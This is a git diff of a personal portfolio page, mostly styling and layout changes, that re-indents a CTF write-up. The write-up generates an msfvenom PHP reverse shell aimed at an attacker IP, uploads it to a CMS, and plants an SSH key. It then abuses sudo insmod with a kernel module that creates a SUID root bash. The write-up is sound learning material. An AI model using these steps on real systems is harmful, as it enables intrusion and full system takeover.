@@ -78,6 +78,9 @@
       margin: 0 auto;
       padding: 2rem;
       width: 100%;
+      min-height: calc(100vh - 60px);
+      display: flex;
+      flex-direction: column;
     }
 
     header {
@@ -177,6 +180,7 @@
       display: flex;
       flex-direction: column;
       align-items: center;
+      flex-grow: 1;
     }
 
     .content-section {
@@ -251,29 +255,6 @@
       height: 3px;
       background: linear-gradient(to right, var(--accent), var(--accent-light), transparent);
       box-shadow: 0 0 12px var(--glow-accent);
-    }
-
-    .security-indicator {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      width: 30px;
-      height: 30px;
-      border-radius: 50%;
-      border: 1px solid var(--accent);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 16px;
-      color: var(--accent);
-      opacity: 0.5;
-      z-index: 100;
-      transition: opacity 0.3s ease;
-      animation: subtle-pulse 4s infinite ease-in-out;
-    }
-
-    .security-indicator:hover {
-      opacity: 0.8;
     }
 
     .writeup-text {
@@ -506,7 +487,6 @@
       white-space: pre;
     }
     
-    /* Syntax highlighting */
     .code-comment {
       color: #6a9955;
       font-style: italic;
@@ -543,6 +523,27 @@
       animation: letter-glow 4s infinite;
     }
 
+    footer {
+      width: 100%;
+      padding: 1rem 0;
+      text-align: center;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.8rem;
+      color: var(--light-gray);
+      opacity: 0.7;
+      margin-top: auto;
+    }
+
+    footer .copyright {
+      display: inline-block;
+    }
+
+    footer .copyright::before {
+      content: "©";
+      margin-right: 0.3rem;
+      color: var(--accent);
+    }
+
     @keyframes pulse {
       0% {
         box-shadow: 0 0 0 0 rgba(204, 58, 75, 0.7);
@@ -557,7 +558,7 @@
 
     @keyframes subtle-pulse {
       0%, 100% {
-        box-shadow: 0 0 5px rgba(204, 58, 75, 0);
+        box-shadow: 0 0 5px rgba(123, 45, 57, 0);
       }
       50% {
         box-shadow: 0 0 10px var(--glow-accent);
@@ -582,13 +583,12 @@
       
       .header-content {
         flex-direction: column;
-        text-align: center;
+        align-items: flex-start;
       }
       
       nav {
-        margin-top: 1.5rem;
-        justify-content: center;
-        flex-wrap: wrap;
+        margin-top: 1rem;
+        gap: 1.5rem;
       }
       
       .section-title, .section-heading {
@@ -611,8 +611,6 @@
   </style>
 </head>
 <body>
-  <canvas id="matrix-canvas"></canvas>
-  
   <div class="container">
     <header>
       <div class="header-accent"></div>
@@ -625,7 +623,7 @@
           <a href="index.html" class="nav-link">Home</a>
           <a href="about.html" class="nav-link">About</a>
           <a href="projects.html" class="nav-link active">Projects</a>
-		<a href="learning.html" class="nav-link">Learning</a>
+          <a href="learning.html" class="nav-link">Learning</a>
           <a href="contact.html" class="nav-link">Contact</a>
         </nav>
       </div>
@@ -737,70 +735,70 @@
           </div>
 
           <!-- Vaihe 6: Reverse Shell Creation -->
-          <div class="challenge-section">
-            <h3 class="step-title"><span class="step-number">6</span> Reverse Shell Creation</h3>
-            
-            <p class="writeup-text">
-              I used <strong>msfvenom</strong> to create a reverse shell PHP payload with the following command:
-              <br><code>msfvenom -p php/reverse_php LHOST=10.10.43.8 LPORT=4444 -f raw > shell.inc</code>
-              <br><br>
-              Then, I uploaded the <strong>shell.inc</strong> file to the <strong>Media</strong> directory within the CMS. After uploading the reverse shell, I set up a listener on my attacker machine to catch the incoming shell connection using <strong>Netcat</strong>.
-              <br><br>
-              I ran the command:
-              <br><code>nc -lvnp 4444</code>
-              <br><br>
-              This allowed me to establish a reverse shell connection with the target machine.
-            </p>
-            
-            <div class="image-container">
-              <img src="images/avengershub7.png" alt="Reverse Shell Creation" class="challenge-image">
-            </div>
-            
-            <div class="image-container">
-              <img src="images/avengershub8.png" alt="Reverse Shell Upload" class="challenge-image">
-            </div>
-          </div>
+<div class="challenge-section">
+  <h3 class="step-title"><span class="step-number">6</span> Reverse Shell Creation</h3>
+  
+  <p class="writeup-text">
+    I used <strong>msfvenom</strong> to create a reverse shell PHP payload with the following command:
+    <br><code>msfvenom -p php/reverse_php LHOST=10.10.43.8 LPORT=4444 -f raw > shell.inc</code>
+    <br><br>
+    Then, I uploaded the <strong>shell.inc</strong> file to the <strong>Media</strong> directory within the CMS. After uploading the reverse shell, I set up a listener on my attacker machine to catch the incoming shell connection using <strong>Netcat</strong>.
+    <br><br>
+    I ran the command:
+    <br><code>nc -lvnp 4444</code>
+    <br><br>
+    This allowed me to establish a reverse shell connection with the target machine.
+  </p>
+  
+  <div class="image-container">
+    <img src="images/avengershub7.png" alt="Reverse Shell Creation" class="challenge-image">
+  </div>
+  
+  <div class="image-container">
+    <img src="images/avengershub8.png" alt="Reverse Shell Upload" class="challenge-image">
+  </div>
+</div>
 
-          <!-- Vaihe 7: SSH Key Authentication -->
-          <div class="challenge-section">
-            <h3 class="step-title"><span class="step-number">7</span> SSH Key Authentication</h3>
-            
-            <p class="writeup-text">
-              Next, I generated an <strong>SSH key pair</strong> to enable SSH access to the target machine.
-              <br><br>
-              The command I used was:
-              <br><code>ssh-keygen -t rsa -b 4096 -f mykey</code>
-              <br><br>
-              Afterward, I added the public key to the <strong>/home/void/.ssh/authorized_keys</strong> file on the target machine, allowing me to log in as the <strong>void</strong> user via SSH.
-              <br><br>
-              I successfully logged into the target machine as the <strong>void</strong> user via SSH using the following command:
-              <br><code>ssh -i mykey void@10.10.237.26</code>
-              <br><br>
-              Once logged in, I accessed the <strong>user.txt</strong> flag, confirming that I had successfully compromised the user account.
-            </p>
-            
-            <div class="image-container">
-              <img src="images/avengershub9.png" alt="SSH Key Generation" class="challenge-image">
-            </div>
-            
-            <div class="image-container">
-              <img src="images/avengershub11.png" alt="SSH Access" class="challenge-image">
-            </div>
-          </div>
+<!-- Vaihe 7: SSH Key Authentication -->
+<div class="challenge-section">
+  <h3 class="step-title"><span class="step-number">7</span> SSH Key Authentication</h3>
+  
+  <p class="writeup-text">
+    Next, I generated an <strong>SSH key pair</strong> to enable SSH access to the target machine.
+    <br><br>
+    The command I used was:
+    <br><code>ssh-keygen -t rsa -b 4096 -f mykey</code>
+    <br><br>
+    Afterward, I added the public key to the <strong>/home/void/.ssh/authorized_keys</strong> file on the target machine, allowing me to log in as the <strong>void</strong> user via SSH.
+    <br><br>
+    I successfully logged into the target machine as the <strong>void</strong> user via SSH using the following command:
+    <br><code>ssh -i mykey void@10.10.237.26</code>
+    <br><br>
+    Once logged in, I accessed the <strong>user.txt</strong> flag, confirming that I had successfully compromised the user account.
+  </p>
+  
+  <div class="image-container">
+    <img src="images/avengershub9.png" alt="SSH Key Generation" class="challenge-image">
+  </div>
+  
+  <div class="image-container">
+    <img src="images/avengershub11.png" alt="SSH Access" class="challenge-image">
+  </div>
+</div>
 
 <!-- Vaihe 8: Privilege Escalation Opportunity -->
 <div class="challenge-section">
   <h3 class="step-title"><span class="step-number">8</span> Privilege Escalation Opportunity</h3>
   
- <p class="writeup-text">
-  Upon running the command <code>sudo -l</code>, I discovered that the <strong>void</strong> user could run the command <code>/sbin/insmod</code> without needing a password. This was a key opportunity for privilege escalation.
-  <br><br>
-  I created the <strong>cyberavengers.c</strong> kernel module, which creates a <strong>SUID binary</strong>. This binary copies the <code>/bin/bash</code> executable to the <code>/tmp/rootbash</code> path and sets the SUID bit to give it root privileges.
-  <br><br>
-  After creating the module, I created a Makefile and compiled the module with make.
-  <br><br>
-  Due to my attackbox crashing, I restarted it and re-ran the necessary steps to continue. As a result, some of the later screenshots and commands show different IP addresses, since the machine was assigned a new one after reboot.
-</p>
+  <p class="writeup-text">
+    Upon running the command <code>sudo -l</code>, I discovered that the <strong>void</strong> user could run the command <code>/sbin/insmod</code> without needing a password. This was a key opportunity for privilege escalation.
+    <br><br>
+    I created the <strong>cyberavengers.c</strong> kernel module, which creates a <strong>SUID binary</strong>. This binary copies the <code>/bin/bash</code> executable to the <code>/tmp/rootbash</code> path and sets the SUID bit to give it root privileges.
+    <br><br>
+    After creating the module, I created a Makefile and compiled the module with make.
+    <br><br>
+    Due to my attackbox crashing, I restarted it and re-ran the necessary steps to continue. As a result, some of the later screenshots and commands show different IP addresses, since the machine was assigned a new one after reboot.
+  </p>
 
   
   <div class="image-container">
@@ -808,8 +806,8 @@
   </div>
   
   <div class="code-container">
-  <h4 class="code-title" style="color: black;">cyberavengers.c - Kernel Module for Privilege Escalation</h4>
-  <pre class="code-block"><code><span class="code-comment"># cyberavengers.c - Kernel module for privilege escalation in CTF
+    <h4 class="code-title" style="color: black;">cyberavengers.c - Kernel Module for Privilege Escalation</h4>
+    <pre class="code-block"><code><span class="code-comment"># cyberavengers.c - Kernel module for privilege escalation in CTF
 # 
 # This module creates a SUID copy of /bin/bash for privilege escalation
 # in a controlled CTF environment. It demonstrates how kernel modules
@@ -865,10 +863,10 @@ module_exit(rev_exit);
 MODULE_LICENSE(<span class="code-string">"GPL"</span>);
 MODULE_AUTHOR(<span class="code-string">"CTF Participant"</span>);
 MODULE_DESCRIPTION(<span class="code-string">"CTF demonstration kernel module for privilege escalation"</span>);</code></pre>
-</div>
-<div class="code-container">
-  <h4 class="code-title" style="color: black;">Makefile - Build Configuration for Kernel Module</h4>
-  <pre class="code-block"><code><span class="code-comment"># Specify the kernel module object file to build</span>
+  </div>
+  <div class="code-container">
+    <h4 class="code-title" style="color: black;">Makefile - Build Configuration for Kernel Module</h4>
+    <pre class="code-block"><code><span class="code-comment"># Specify the kernel module object file to build</span>
 <span class="code-keyword">obj-m</span> += <span class="code-string">cyberavengers.o</span>
 
 <span class="code-comment"># Default build rule - builds the kernel module against current kernel headers</span>
@@ -878,58 +876,69 @@ MODULE_DESCRIPTION(<span class="code-string">"CTF demonstration kernel module fo
 <span class="code-comment"># Clean rule - removes all generated files</span>
 <span class="code-keyword">clean:</span>
 	<span class="code-function">make</span> -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</code></pre>
+  </div>
 </div>
+
+<!-- Vaihe 9: Root Access -->
+<div class="challenge-section">
+  <h3 class="step-title"><span class="step-number">9</span> Root Access</h3>
+  
+  <p class="writeup-text">
+    Once I had successfully compiled the module, I uploaded it to the target machine using:
+    <br><code>sudo /sbin/insmod cyberavengers.ko</code>
+    <br><br>
+    I verified that the <strong>/tmp/rootbash</strong> binary was created and had the correct permissions to be executed as root.
+    <br><br>
+    I ran the SUID binary with the command:
+    <br><code>/tmp/rootbash -p</code>
+    <br><br>
+    This gave me root privileges. I confirmed that I had root access by running the id command, which displayed that I was logged in as the root user.
+  </p>
+  
+  <div class="image-container">
+    <img src="images/avengershub12.png" alt="Root Access" class="challenge-image">
+  </div>
 </div>
 
-      <!-- Vaihe 9: Root Access -->
-      <div class="challenge-section">
-        <h3 class="step-title"><span class="step-number">9</span> Root Access</h3>
-        
-        <p class="writeup-text">
-          Once I had successfully compiled the module, I uploaded it to the target machine using:
-          <br><code>sudo /sbin/insmod cyberavengers.ko</code>
-          <br><br>
-          I verified that the <strong>/tmp/rootbash</strong> binary was created and had the correct permissions to be executed as root.
-          <br><br>
-          I ran the SUID binary with the command:
-          <br><code>/tmp/rootbash -p</code>
-          <br><br>
-          This gave me root privileges. I confirmed that I had root access by running the id command, which displayed that I was logged in as the root user.
-        </p>
-        
-        <div class="image-container">
-          <img src="images/avengershub12.png" alt="Root Access" class="challenge-image">
-        </div>
-      </div>
+<!-- Flag Capture -->
+<div class="challenge-section">
+  <h3 class="step-title"><span class="step-number">✓</span> Flag Capture</h3>
+  
+  <p class="writeup-text">
+    Finally, I found the root flag from <strong>/root/root.txt</strong> by running the following command:
+    <br><code>cat /root/root.txt</code>
+  </p>
+  
+  <div class="image-container">
+    <img src="images/avengershub13.png" alt="Root Flag" class="challenge-image">
+  </div>
+</div>
 
-      <!-- Flag Capture -->
-      <div class="challenge-section">
-        <h3 class="step-title"><span class="step-number">✓</span> Flag Capture</h3>
-        
-        <p class="writeup-text">
-          Finally, I found the root flag from <strong>/root/root.txt</strong> by running the following command:
-          <br><code>cat /root/root.txt</code>
-        </p>
-        
-        <div class="image-container">
-          <img src="images/avengershub13.png" alt="Root Flag" class="challenge-image">
-        </div>
-      </div>
+<div class="summary-section">
+  <h3 class="summary-title">Challenge Summary</h3>
+  
+  <div class="summary-content">
+    <p class="writeup-text">
+      <strong>Overview:</strong> The Cyber Avengers' private server had been hijacked by an attacker named Cipher, who locked out legitimate users and left a malicious web shell behind. My mission was to retrace his steps, gain access to the compromised system, escalate privileges, and ultimately reclaim control by obtaining root access.
+    </p>
+    
+    <p class="writeup-text">
+      <strong>What I learned:</strong> I encountered several challenges while working on this task, but it was the most educational and enjoyable challenge for me in this CTF. This provided solid hands-on practice and let me explore how these tools work together as part of a complete process.
+    </p>
+  </div>
+</div>
 
-      <div class="summary-section">
-        <h3 class="summary-title">Challenge Summary</h3>
-        
-        <div class="summary-content">
-          <p class="writeup-text">
-            <strong>Overview:</strong> The Cyber Avengers' private server had been hijacked by an attacker named Cipher, who locked out legitimate users and left a malicious web shell behind. My mission was to retrace his steps, gain access to the compromised system, escalate privileges, and ultimately reclaim control by obtaining root access.
-          </p>
-          
-          <p class="writeup-text">
-            <strong>What I learned:</strong> I encountered several challenges while working on this task, but it was the most educational and enjoyable challenge for me in this CTF. This provided solid hands-on practice and let me explore how these tools work together as part of a complete process.
-          </p>
-        </div>
-      </div>
-
-      <div class="navigation-buttons">
+<div class="navigation-buttons">
         <a href="hackfinity-ctf.html" class="back-button">Back to CTF Challenges</a>
       </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <span class="copyright">Minni Wessman 2025</span>
+</footer>
+
+</div>
+</body>
+</html>
